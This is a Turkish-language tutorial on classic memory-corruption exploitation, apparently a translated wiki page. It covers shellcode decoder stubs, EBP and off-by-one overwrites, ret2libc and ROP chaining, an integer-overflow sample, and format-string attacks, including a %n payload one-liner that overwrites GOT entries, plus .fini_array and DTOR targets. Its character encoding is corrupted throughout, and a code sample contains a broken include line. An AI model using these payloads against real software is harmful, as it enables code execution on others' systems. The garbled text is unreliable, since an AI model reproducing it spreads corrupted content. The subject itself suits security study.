Egg Hunter, kÃ¼Ã§Ã¼k bir kod parÃ§asÄ±dÄ±r ve bir sÃ¼reÃ§le iliÅŸkili bellek sayfalarÄ±nÄ± tarayarak orada saklanan shellcode'u bulur (shellcode'da belirli bir imza arar). Sadece kod enjekte etmek iÃ§in sÄ±nÄ±rlÄ± bir alan olduÄŸu durumlarda kullanÄ±ÅŸlÄ±dÄ±r.

**Polimorfik Shellcode'lar**

Polimorfik shellcode'lar, kÃ¼Ã§Ã¼k bir kod parÃ§asÄ±yla ÅŸifrelenmiÅŸ shellcode'lardÄ±r ve onlarÄ± Ã§Ã¶zen ve ona atlayan bir kod parÃ§asÄ± kullanÄ±r. Bu, Call-Pop hilesi kullanÄ±larak ÅŸifrelenmiÅŸ bir Ã¶rnektir:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
1. **Frame Pointer (EBP) SaldÄ±rÄ±sÄ±**

EBP'yi deÄŸiÅŸtirebiliriz ancak EIP'yi deÄŸiÅŸtiremezsek kullanÄ±ÅŸlÄ± bir durumda.

Bir fonksiyondan Ã§Ä±karken aÅŸaÄŸÄ±daki derlenmiÅŸ kodun Ã§alÄ±ÅŸtÄ±ÄŸÄ± bilinmektedir:
```
movl               %ebp, %esp
popl                %ebp
ret
```
Bu ÅŸekilde, baÅŸka bir fonksiyon tarafÄ±ndan Ã§aÄŸrÄ±lan bir fonksiyon (fvuln) Ã§Ä±kÄ±ÅŸÄ±nda EBP deÄŸiÅŸtirilebilir. Ã‡aÄŸÄ±ran fonksiyon tamamlandÄ±ÄŸÄ±nda, EIP deÄŸiÅŸtirilebilir.

fvuln iÃ§inde, EBP'yi yanlÄ±ÅŸ bir yere yÃ¶nlendiren bir EBP girilebilir. Bu, fonksiyondan Ã§Ä±karken, ESP'ye &(\&Shellcode)+4 deÄŸeri yerleÅŸtirilir. Pop ile ESP'den 4 Ã§Ä±karÄ±lÄ±r ve bu, ret Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda ESP'nin shellcode adresine iÅŸaret etmesini saÄŸlar.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + doldurma + &(\&Shellcode)+4

**Off-by-One Exploit**\
YalnÄ±zca EBP'nin en az anlamlÄ± baytÄ± deÄŸiÅŸtirilebilir. YukarÄ±daki saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek mÃ¼mkÃ¼ndÃ¼r, ancak shellcode adresini tutan belleÄŸin ilk 3 baytÄ± EBP ile paylaÅŸmalÄ±dÄ±r.

## **4. return to Libc YÃ¶ntemleri**

Stack Ã§alÄ±ÅŸtÄ±rÄ±lamaz veya deÄŸiÅŸtirilecek Ã§ok kÃ¼Ã§Ã¼k bir tampon bÄ±rakÄ±ldÄ±ÄŸÄ±nda kullanÄ±ÅŸlÄ± bir yÃ¶ntemdir.

ASLR, her Ã§alÄ±ÅŸtÄ±rmada iÅŸlevlerin bellekte farklÄ± konumlara yÃ¼klenmesine neden olur. Bu nedenle bu yÃ¶ntem bu durumda etkili olmayabilir. Uzaktan sunucular iÃ§in, program sÃ¼rekli olarak aynÄ± adreste Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ± iÃ§in bu yÃ¶ntem kullanÄ±ÅŸlÄ± olabilir.

* **cdecl(C declaration)** ArgÃ¼manlarÄ± stack'e yerleÅŸtirir ve fonksiyondan Ã§Ä±ktÄ±ktan sonra yÄ±ÄŸÄ±tÄ± temizler
* **stdcall(standard call)** ArgÃ¼manlarÄ± stack'e yerleÅŸtirir ve Ã§aÄŸrÄ±lan fonksiyon yÄ±ÄŸÄ±tÄ± temizler
* **fastcall** Ä°lk iki argÃ¼manÄ± kaydedicilere ve geri kalanÄ±nÄ± stack'e yerleÅŸtirir

Libc'nin system talimatÄ±nÄ±n adresi verilir ve genellikle bir ortam deÄŸiÅŸkeninden "bin/sh" dizesi olarak geÃ§irilir. AyrÄ±ca, programÄ±n daha fazla kabuk gerektirmeyeceÄŸi zaman Ã§Ä±kÄ±ÅŸ fonksiyonunun adresi kullanÄ±lÄ±r (ve gÃ¼nlÃ¼k yazma sorunlarÄ± olmamasÄ± iÃ§in).

**export SHELL=/bin/sh**

Ä°htiyacÄ±mÄ±z olan adresleri bulmak iÃ§in **GDB** iÃ§inde bakÄ±labilir:\
**p system**\
**p exit**\
**rabin2 -i executable** â€”> ProgramÄ±n yÃ¼klenirken kullandÄ±ÄŸÄ± tÃ¼m iÅŸlevlerin adresini verir\
(Bir baÅŸlangÄ±Ã§ veya bir kesme noktasÄ± iÃ§inde): **x/500s $esp** â€”> Burada /bin/sh dizesini ararÄ±z

Bu adreslere sahip olduktan sonra **exploit** ÅŸu ÅŸekilde olur:

â€œAâ€ \* EBP UZAKLIÄI + 4 (EBP: 4 "A" olabilir, ancak hata ayÄ±klama hatasÄ± olmamasÄ± iÃ§in EBP'nin gerÃ§ek deÄŸeri daha iyidir) + **system** adresi (EIP Ã¼zerine yazacak) + **exit** adresi (system("bin/sh") Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda bu iÅŸlevi Ã§aÄŸÄ±racak Ã§Ã¼nkÃ¼ yÄ±ÄŸÄ±nÄ±n ilk 4 baytÄ±, yÃ¼rÃ¼tÃ¼lecek sonraki EIP adresi olarak iÅŸlenir) + "**/bin/sh**" adresi (system'e geÃ§irilecek parametre olacak)

Bu ÅŸekilde EIP, system adresiyle Ã¼zerine yazÄ±lacak ve parametre olarak "bin/sh" dizesini alacak ve bunun dÄ±ÅŸÄ±nda Ã§Ä±karken exit() iÅŸlevini Ã§alÄ±ÅŸtÄ±racaktÄ±r.

Bir fonksiyonun herhangi bir adresinin bir baytÄ±nÄ±n null veya boÅŸluk (\x20) olabileceÄŸi durumla karÅŸÄ±laÅŸÄ±labilir. Bu durumda, Ã¶nceki adresleri ayrÄ±ÅŸtÄ±rabiliriz, Ã§Ã¼nkÃ¼ muhtemelen doÄŸrudan fonksiyon yerine bunlardan birini Ã§aÄŸÄ±rmamÄ±za izin verecek birkaÃ§ NOP vardÄ±r (Ã¶rneÄŸin > x/8i system-4 ile).

Bu yÃ¶ntem, fonksiyonu **call** yerine **ret** kullanarak system gibi bir iÅŸlevi Ã§aÄŸÄ±rdÄ±ÄŸÄ±mÄ±zda, iÅŸlevin ilk 4 baytÄ±n dÃ¶nÃ¼ÅŸ yapÄ±lacak adres olduÄŸunu anlamasÄ± nedeniyle Ã§alÄ±ÅŸÄ±r.

Bu yÃ¶ntemle ilgili ilginÃ§ bir teknik, bir yÃ¼kÃ¼ yÄ±ÄŸÄ±ndan heap'e taÅŸÄ±mak iÃ§in **strncpy()** Ã§aÄŸÄ±rmaktÄ±r ve ardÄ±ndan bu yÃ¼kÃ¼ yÃ¼rÃ¼tmek iÃ§in **gets()** kullanmaktÄ±r.

BaÅŸka bir ilginÃ§ teknik, herhangi bir bellek bÃ¶lgesine istenen izinleri atamayÄ± saÄŸlayan **mprotect()** kullanmaktÄ±r. BDS, MacOS ve OpenBSD'de Ã§alÄ±ÅŸÄ±r veya Ã§alÄ±ÅŸÄ±rdÄ±, ancak linux'ta (yazma ve yÃ¼rÃ¼tme izinlerini aynÄ± anda verememe kontrolÃ¼) Ã§alÄ±ÅŸmaz. Bu saldÄ±rÄ± ile yÄ±ÄŸÄ±tÄ± yeniden yÃ¼rÃ¼tÃ¼lebilir olarak yeniden yapÄ±landÄ±rmak mÃ¼mkÃ¼n olabilir.

**Fonksiyon Zincirleme**

Ã–nceki yÃ¶nteme dayanarak, bu exploit yÃ¶ntemi ÅŸu ÅŸekildedir:\
Doldurma + \&Fonksiyon1 + \&pop;ret; + \&arg\_fun1 + \&Fonksiyon2 + \&pop;ret; + \&arg\_fun2 + ...

Bu ÅŸekilde Ã§aÄŸrÄ±lacak fonksiyonlar zincirlenebilir. AyrÄ±ca, birden fazla argÃ¼manÄ± olan fonksiyonlarÄ± kullanmak isterseniz, gerekli argÃ¼manlarÄ± (Ã¶rneÄŸin 4) yerleÅŸtirebilir ve 4 argÃ¼manÄ± yerleÅŸtirebilir ve opcodes iÃ§eren bir adrese yÃ¶nelik bir adres bulabilirsiniz: pop, pop, pop, pop, ret â€”> **objdump -d executable**

**EBP zincirleme ile Zincirleme**

EBP'yi manipÃ¼le etme gÃ¼cÃ¼nden yararlanarak, EBP ve "leave;ret" kullanarak birkaÃ§ fonksiyonun yÃ¼rÃ¼tÃ¼lmesini zincirlemek mÃ¼mkÃ¼ndÃ¼r.

DOLDURMA

* EBP'yi, 2. EBP\_fake + yÃ¼rÃ¼tÃ¼lecek fonksiyonun adresine iÅŸaret eden yanlÄ±ÅŸ bir EBP'ye yerleÅŸtirin: (\&system() + \&leave;ret + &â€œ/bin/shâ€)
* EIP'ye bir fonksiyonun &(leave;ret) adresini koyun

Shellcode'u, shellcode'un bir sonraki bÃ¶lÃ¼mÃ¼nÃ¼n adresiyle baÅŸlatÄ±n, Ã¶rneÄŸin: 2. EBP\_fake + \&system() + &(leave;ret;) + &â€/bin/shâ€

2. EBP ÅŸu ÅŸekilde olur: 3. EBP\_fake + \&system() + &(leave;ret;) + &â€/bin/lsâ€

Bu shellcode, belleÄŸin eriÅŸilebilen bÃ¶lgelerinde sonsuz bir ÅŸekilde tekrarlanabilir, bÃ¶ylece kÃ¼Ã§Ã¼k bellek parÃ§alarÄ±na bÃ¶lÃ¼nebilen bir shellcode elde edilir.

(Fonksiyon zincirleme ve EBP ve ret2lib Ã¶nceki zayÄ±flÄ±klarÄ± birleÅŸtirerek fonksiyonlarÄ±n yÃ¼rÃ¼tÃ¼lmesini zincirlemektedir)

## **5. Ek YÃ¶ntemler**

**Ret2Ret**

EBP'ye yÄ±ÄŸÄ±n adresi yerleÅŸtirilemediÄŸinde (EIP'nin 0xbf iÃ§ermediÄŸi kontrol edilir) veya shellcode'un konumu hesaplanamadÄ±ÄŸÄ±nda kullanÄ±ÅŸlÄ±dÄ±r. Ancak, savunmasÄ±z iÅŸlev bir parametre kabul eder (shellcode buraya gidecektir).

Bu ÅŸekilde, EIP'yi bir **ret** adresine deÄŸiÅŸtirerek, bir sonraki adres yÃ¼klenecektir (bu, iÅŸlevin ilk argÃ¼manÄ±nÄ±n adresidir). Yani, shellcode yÃ¼klenecektir.

Exploit ÅŸu ÅŸekilde olur: SHELLCODE + Doldurma (EIP'ye kadar) + **\&ret** (yÄ±ÄŸÄ±nÄ±n sonraki baytlarÄ±, geÃ§irilen parametrenin baÅŸlangÄ±cÄ±na iÅŸaret ettiÄŸi iÃ§in, burada shellcode'un baÅŸlangÄ±cÄ±na iÅŸaret eder)

GÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re **strncpy** gibi iÅŸlevler, tamamlandÄ±ktan sonra shellcode'un saklandÄ±ÄŸÄ± adresi yÄ±ÄŸÄ±ttan kaldÄ±rÄ±r, bu da bu tekniÄŸi imkansÄ±z kÄ±lar. Yani, iÅŸlevin bir argÃ¼man olarak geÃ§tiÄŸi adres (shellcode'u saklayan adres) bir 0x00 ile deÄŸiÅŸtirilir, bu nedenle ikinci **ret** Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda bir 0x00 ile karÅŸÄ±laÅŸÄ±lÄ±r ve program Ã§Ã¶ker.
```
**Ret2PopRet**
```
EÄŸer ilk argÃ¼man Ã¼zerinde kontrolÃ¼mÃ¼z yoksa, ancak ikinci veya Ã¼Ã§Ã¼ncÃ¼ argÃ¼man Ã¼zerinde kontrolÃ¼mÃ¼z varsa, EIP'yi pop-ret veya pop-pop-ret adresiyle Ã¼zerine yazabiliriz, ihtiyaca gÃ¶re.

**Murat TekniÄŸi**

Linux'ta tÃ¼m programlar 0xbfffffff'den baÅŸlayarak eÅŸlenir.

Linux'ta yeni bir sÃ¼recin yÄ±ÄŸÄ±nÄ± nasÄ±l oluÅŸturulduÄŸuna bakarak, programÄ±n yalnÄ±zca shellcode olan bir ortamda baÅŸlatÄ±lmasÄ±nÄ± saÄŸlayacak bir exploit geliÅŸtirilebilir. Bu adres ÅŸu ÅŸekilde hesaplanabilir: addr = 0xbfffffff - 4 - strlen(FULL\_EXECUTABLE\_NAME) - strlen(shellcode)

Bu ÅŸekilde, shellcode ile Ã§evre deÄŸiÅŸkeninin bulunduÄŸu adres kolayca elde edilir.

Bu, execle fonksiyonunun yalnÄ±zca istenen Ã§evre deÄŸiÅŸkenlerine sahip bir ortam oluÅŸturmasÄ±na izin verdiÄŸi iÃ§in mÃ¼mkÃ¼ndÃ¼r.

**ESP'ye Atla: Windows TarzÄ±**

ESP her zaman yÄ±ÄŸÄ±nÄ±n baÅŸÄ±na iÅŸaret ettiÄŸi iÃ§in, bu teknik EIP'yi **jmp esp** veya **call esp** Ã§aÄŸrÄ±sÄ±yla deÄŸiÅŸtirerek gerÃ§ekleÅŸtirilir. BÃ¶ylece, EIP Ã¼zerine yazma iÅŸleminden sonra shellcode kaydedilir Ã§Ã¼nkÃ¼ **ret** komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ktan sonra ESP, shellcode'un kaydedildiÄŸi yerin hemen sonraki adrese iÅŸaret eder.

Windows veya Linux'ta ASLR etkin deÄŸilse, **jmp esp** veya **call esp** Ã§aÄŸrÄ±larÄ± paylaÅŸÄ±lan bir nesnede depolanabilir. ASLR etkinse, savunmasÄ±z olan programÄ±n iÃ§inde aranabilir.

AyrÄ±ca, shellcode'u yÄ±ÄŸÄ±nÄ±n ortasÄ±na yerleÅŸtirmek yerine EIP'nin bozulmasÄ±ndan sonra shellcode'u yerleÅŸtirebilmek, fonksiyonun ortasÄ±nda Ã§alÄ±ÅŸan push veya pop talimatlarÄ±nÄ±n shellcode'a dokunmamasÄ±nÄ± saÄŸlar.

Benzer ÅŸekilde, bir fonksiyonun shellcode'un kaydedildiÄŸi adresi dÃ¶ndÃ¼rdÃ¼ÄŸÃ¼ biliniyorsa, **call eax** veya **jmp eax (ret2eax)** Ã§aÄŸrÄ±sÄ± yapÄ±labilir.

**ROP (Return Oriented Programming) veya Ã¶dÃ¼nÃ§ alÄ±nan kod parÃ§alarÄ±**

Ã‡aÄŸrÄ±lan kod parÃ§alarÄ±na "gadget" denir.

Bu teknik, **ret2libc** tekniÄŸi ve **pop,ret** kullanarak farklÄ± fonksiyonlara Ã§aÄŸrÄ± yapmayÄ± zincirlemeyi iÃ§erir.

BazÄ± iÅŸlemci mimarilerinde her talimat 32 bitlik bir dizi olabilir (Ã¶rneÄŸin MIPS). Ancak Intel'de talimatlar deÄŸiÅŸken boyutludur ve bir dizi biti paylaÅŸabilir, Ã¶rneÄŸin:

**movl $0xe4ff, -0x(%ebp)** â€”> 0xffe4 baytlarÄ±nÄ± iÃ§erir, aynÄ± zamanda **jmp \*%esp** olarak da Ã§evrilebilir.

Bu ÅŸekilde, aslÄ±nda orijinal programda bile bulunmayan bazÄ± talimatlar Ã§alÄ±ÅŸtÄ±rÄ±labilir.

**ROPgadget.py**, ikili dosyalarda deÄŸerleri bulmamÄ±za yardÄ±mcÄ± olur.

Bu program ayrÄ±ca **payload** oluÅŸturmak iÃ§in de kullanÄ±labilir. ROP'larÄ± Ã§Ä±karmanÄ±z gereken kÃ¼tÃ¼phaneyi verirseniz, size kullanÄ±lmaya hazÄ±r bir Python payloadu oluÅŸturur. AyrÄ±ca, sistem Ã§aÄŸrÄ±larÄ± kullandÄ±ÄŸÄ± iÃ§in gerÃ§ekte yÄ±ÄŸÄ±nda bir ÅŸey Ã§alÄ±ÅŸtÄ±rmaz, sadece **ret** komutuyla Ã§alÄ±ÅŸtÄ±rÄ±lacak ROP adreslerini kaydeder. Bu payload'u kullanmak iÃ§in payloadu bir **ret** talimatÄ±yla Ã§aÄŸÄ±rmak gerekir.

**TamsayÄ± TaÅŸmalarÄ±**

Bu tÃ¼r taÅŸmalar, bir deÄŸiÅŸkenin verilen sayÄ± kadar bÃ¼yÃ¼k bir sayÄ±yÄ± desteklemeye hazÄ±r olmadÄ±ÄŸÄ± durumlarda meydana gelir, muhtemelen iÅŸaretli ve iÅŸaretsiz deÄŸiÅŸkenler arasÄ±ndaki bir karÄ±ÅŸÄ±klÄ±k nedeniyle, Ã¶rneÄŸin:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Ã–nceki Ã¶rnekte, programÄ±n 2 parametre beklediÄŸini gÃ¶rÃ¼yoruz. Ä°lk parametre, bir sonraki dizenin uzunluÄŸu ve ikinci parametre dizedir.

EÄŸer ilk parametreyi negatif bir sayÄ± olarak verirsek, len < 256 olacak ve bu filtreyi geÃ§eceÄŸiz. AyrÄ±ca strlen(buffer) da l'den kÃ¼Ã§Ã¼k olacak Ã§Ã¼nkÃ¼ l unsigned int tÃ¼rÃ¼nde ve Ã§ok bÃ¼yÃ¼k olacak.

Bu tÃ¼r taÅŸmalar, bir programÄ±n iÅŸlemine bir ÅŸeyler yazmayÄ± hedeflemiyor, ancak baÅŸka gÃ¼venlik aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rmek iÃ§in kÃ¶tÃ¼ tasarlanmÄ±ÅŸ filtreleri aÅŸmayÄ± amaÃ§lÄ±yor.

**Ä°lk deÄŸeri atanmamÄ±ÅŸ deÄŸiÅŸkenler**

Ä°lk deÄŸeri atanmamÄ±ÅŸ bir deÄŸiÅŸkenin alabileceÄŸi deÄŸer bilinmez ve bunu gÃ¶zlemlemek ilginÃ§ olabilir. Ã–nceki iÅŸlevin bir deÄŸiÅŸkeninin alabileceÄŸi deÄŸeri alabilir ve bu deÄŸiÅŸken saldÄ±rgan tarafÄ±ndan kontrol edilebilir.

## **BiÃ§im Dizeleri**

C'de **`printf`** iÅŸlevi bir dizeyi yazdÄ±rmak iÃ§in kullanÄ±labilen bir iÅŸlevdir. Bu iÅŸlevin beklediÄŸi **ilk parametre**, **biÃ§imlendiricilerle** birlikte **ham metin**dir. Beklenen **sonraki parametreler**, ham metinden biÃ§imlendiricileri **deÄŸiÅŸtirmek iÃ§in kullanÄ±lacak deÄŸerlerdir**.

Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, bir saldÄ±rgan metnin bu iÅŸlevin ilk argÃ¼manÄ± olarak konulduÄŸunda ortaya Ã§Ä±kar. SaldÄ±rgan, **printf biÃ§imlendirme** yeteneklerini kÃ¶tÃ¼ye kullanarak **herhangi bir veriyi herhangi bir adrese yazabilen** Ã¶zel bir giriÅŸ oluÅŸturabilir. Bu ÅŸekilde keyfi kodu yÃ¼rÃ¼tebilir.

BiÃ§imlendiriciler:
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**`%n`** **belirtilen adrese yazÄ±lan** **bayt sayÄ±sÄ±nÄ± yazar**. Yazmak istediÄŸimiz veriyi yazabilmek iÃ§in yazmamÄ±z gereken onaltÄ±lÄ±k sayÄ± kadar bayt yazmak, herhangi bir veriyi yazmanÄ±n yoludur.
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

Bu, program tarafÄ±ndan kullanÄ±lan **harici fonksiyonlarÄ±n adresini** iÃ§eren tablodur.

Bu tablonun adresini ÅŸu komutla alÄ±n: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

GEF ile yÃ¼rÃ¼tÃ¼lebilir dosyanÄ±n yÃ¼klenmesinden sonra **GOT** iÃ§indeki **fonksiyonlarÄ±** gÃ¶rebilirsiniz: `gefâ¤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

GEF kullanarak hata ayÄ±klama oturumu baÅŸlatabilir ve got tablosunu gÃ¶rmek iÃ§in **`got`** komutunu Ã§alÄ±ÅŸtÄ±rabilirsiniz:

![](<../../.gitbook/assets/image (621).png>)

Bir ikili dosyada GOT, **fonksiyonlarÄ±n adreslerini veya** fonksiyon adresini yÃ¼kleyecek olan **PLT** bÃ¶lÃ¼mÃ¼nÃ¼n adreslerini iÃ§erir. Bu saldÄ±rÄ±nÄ±n amacÄ±, daha sonra **`system`** **fonksiyonunun PLT adresiyle GOT giriÅŸini geÃ§ersiz kÄ±lmaktÄ±r**. Ä°deal olarak, **kendi kontrolÃ¼nÃ¼zdeki parametreleri** ile Ã§aÄŸrÄ±lacak bir fonksiyonun GOT'unu geÃ§ersiz kÄ±lacaksÄ±nÄ±z (bÃ¶ylece sistem fonksiyonuna gÃ¶nderilen parametreleri kontrol edebileceksiniz).

EÄŸer **`system`** **kullanÄ±lmÄ±yorsa**, sistem fonksiyonunun GOT'ta bir giriÅŸi olmayacaktÄ±r. Bu senaryoda, **ilk olarak `system` fonksiyonunun adresini sÄ±zdÄ±rmanÄ±z gerekecektir**.

**Procedure Linkage Table**, Ã§Ã¶zÃ¼lmesi gereken tÃ¼m gerekli sembolleri depolayan ELF dosyasÄ±ndaki **salt okunur** bir tablodur. Bu fonksiyonlardan biri Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, GOT **akÄ±ÅŸÄ±** PLT'ye **yÃ¶nlendirir** ve fonksiyonun adresini Ã§Ã¶zer ve GOT Ã¼zerine yazar.\
Sonra, o adrese yapÄ±lan bir sonraki Ã§aÄŸrÄ±da fonksiyon doÄŸrudan Ã§aÄŸrÄ±lÄ±r ve Ã§Ã¶zÃ¼lmesi gerekmez.

PLT adreslerini **`objdump -j .plt -d ./vuln_binary`** komutuyla gÃ¶rebilirsiniz.

### **SaldÄ±rÄ± AkÄ±ÅŸÄ±**

Daha Ã¶nce aÃ§Ä±klandÄ±ÄŸÄ± gibi, hedef, daha sonra Ã§aÄŸrÄ±lacak olan GOT tablosundaki bir fonksiyonun adresini **geÃ§ersiz kÄ±rmak** olacaktÄ±r. Ä°deal olarak, bir yÃ¼rÃ¼tÃ¼lebilir bÃ¶lÃ¼mde bulunan bir kabuk kodunun adresini ayarlayabilirdik, ancak bÃ¼yÃ¼k olasÄ±lÄ±kla bir yÃ¼rÃ¼tÃ¼lebilir bÃ¶lÃ¼mde bir kabuk kodu yazamayacaksÄ±nÄ±z.\
Bu nedenle, kullanÄ±cÄ±nÄ±n argÃ¼manlarÄ±nÄ± alan bir fonksiyonu **geÃ§ersiz kÄ±lacak ÅŸekilde** bir fonksiyonu **geÃ§ersiz kÄ±lmak** farklÄ± bir seÃ§enektir.

Adresi yazmak iÃ§in genellikle 2 adÄ±m yapÄ±lÄ±r: Ä°lk olarak, adresin **2 baytÄ±nÄ± yazarsÄ±nÄ±z** ve ardÄ±ndan diÄŸer 2 baytÄ±. Bunun iÃ§in **`$hn`** kullanÄ±lÄ±r.

**HOB**, adresin 2 yÃ¼ksek baytÄ±nÄ± Ã§aÄŸÄ±rÄ±r\
**LOB**, adresin 2 dÃ¼ÅŸÃ¼k baytÄ±nÄ± Ã§aÄŸÄ±rÄ±r

Bu nedenle, format dizesinin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±ndan dolayÄ±, \[HOB, LOB]'den **ilk Ã¶nce en kÃ¼Ã§Ã¼ÄŸÃ¼ yazmanÄ±z** ve ardÄ±ndan diÄŸerini yazmanÄ±z gerekir.

EÄŸer HOB < LOB ise\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

EÄŸer HOB > LOB ise\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Format String SaldÄ±rÄ±sÄ± Åablonu**

GOT'u format dizesi kullanarak sÃ¶mÃ¼rmek iÃ§in bir **ÅŸablon** bulabilirsiniz:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

Bu, programÄ±n sonlandÄ±ktan Ã¶nce Ã§aÄŸrÄ±lacak olan **fonksiyonlarÄ± iÃ§eren bir yapÄ±dÄ±r**. Bu, **bir adrese atlayarak kabuk kodunuzu Ã§aÄŸÄ±rabilirsiniz** veya format dizesini ikinci kez sÃ¶mÃ¼rmek iÃ§in tekrar ana programa dÃ¶nmek gerektiÄŸi durumlarda ilginÃ§ olabilir.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Bu, bir **sonsuz dÃ¶ngÃ¼** oluÅŸturmayacak Ã§Ã¼nkÃ¼ ana fonksiyona geri dÃ¶ndÃ¼ÄŸÃ¼nÃ¼zde canary bunu fark edecek, yÄ±ÄŸÄ±nÄ±n sonu bozulmuÅŸ olabilir ve fonksiyon tekrar Ã§aÄŸrÄ±lmayacak. Bu sayede, vuln'un **1 kez daha Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±** saÄŸlayabilirsiniz.

### **Ä°Ã§eriÄŸi DÃ¶kÃ¼mlemek Ä°Ã§in Format Dizeleri**

Bir format dizesi, programÄ±n belleÄŸinden iÃ§eriÄŸi **dÃ¶kmek** iÃ§in de kullanÄ±labilir.\
Ã–rneÄŸin, aÅŸaÄŸÄ±daki durumda, bir bayraÄŸa iÅŸaret eden yÄ±ÄŸÄ±nda bir **yerel deÄŸiÅŸken** bulunmaktadÄ±r. BayraÄŸÄ±n **bellekte** nerede olduÄŸunu **bulursanÄ±z**, **printf**'in o **adrese eriÅŸmesini** ve **bayraÄŸÄ± yazdÄ±rmasÄ±nÄ±** saÄŸlayabilirsiniz:

Yani, bayrak **0xffffcf4c** adresinde bulunuyor.

![](<../../.gitbook/assets/image (618) (2).png>)

Ve sÄ±zÄ±ntÄ±dan, **bayraÄŸa iÅŸaret eden** iÅŸaretÃ§inin **8.** parametrede olduÄŸunu gÃ¶rebilirsiniz:

![](<../../.gitbook/assets/image (623).png>)

Bu nedenle, **8. parametreye eriÅŸerek** bayraÄŸÄ± alabilirsiniz:

![](<../../.gitbook/assets/image (624).png>)

Ã–nceki saldÄ±rÄ±yÄ± takip ederek ve iÃ§eriÄŸi sÄ±zdÄ±rabileceÄŸinizi fark ederek, **`printf`'e** yÃ¼rÃ¼tÃ¼lebilir dosyanÄ±n yÃ¼klendiÄŸi bÃ¶lÃ¼me **iÅŸaretÃ§iler** ayarlayabilir ve onu **tamamen** dÃ¶kÃ¼mleyebilirsiniz!

### **DTOR**

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde bir dtor bÃ¶lÃ¼mÃ¼ne sahip bir ikili bulmak Ã§ok **garip**.
{% endhint %}

Destructor, programÄ±n **sonlandÄ±ÄŸÄ±ndan Ã¶nce** Ã§alÄ±ÅŸtÄ±rÄ±lan fonksiyonlardÄ±r.\
EÄŸer **`__DTOR_END__`**'de bir **shellcode** iÃ§in bir **adres** yazmayÄ± baÅŸarÄ±rsanÄ±z, bu program sona ermeden Ã¶nce **Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r**.\
Bu bÃ¶lÃ¼mÃ¼n adresini ÅŸu ÅŸekilde alÄ±n:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep â€œ__DTORâ€
```
Genellikle **DTOR** bÃ¶lÃ¼mÃ¼nÃ¼ `ffffffff` ve `00000000` deÄŸerleri arasÄ±nda bulacaksÄ±nÄ±z. Bu deÄŸerleri gÃ¶rÃ¼yorsanÄ±z, bu, **hiÃ§bir iÅŸlevin kaydedilmediÄŸi** anlamÄ±na gelir. Bu nedenle, **`00000000`** deÄŸerini **shellcode'Ä±n adresiyle Ã¼zerine yazarak** Ã§alÄ±ÅŸtÄ±rabilirsiniz.

### **Format Strings to Buffer Overflows**

**sprintf**, bir **deÄŸiÅŸkene** biÃ§imlendirilmiÅŸ bir dizeyi **taÅŸÄ±r**. Bu nedenle, bir dizenin biÃ§imlendirmesini kÃ¶tÃ¼ye kullanarak, iÃ§eriÄŸin kopyalandÄ±ÄŸÄ± deÄŸiÅŸkende bir **tampon taÅŸmasÄ±na neden olabilirsiniz**.\
Ã–rneÄŸin, `%.44xAAAA` yÃ¼kÃ¼, deÄŸiÅŸkene 44B+"AAAA" yazacak ve bu bir tampon taÅŸmasÄ±na neden olabilir.

### **\_\_atexit YapÄ±larÄ±**

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde bunu **saldÄ±rmak Ã§ok garip**.
{% endhint %}

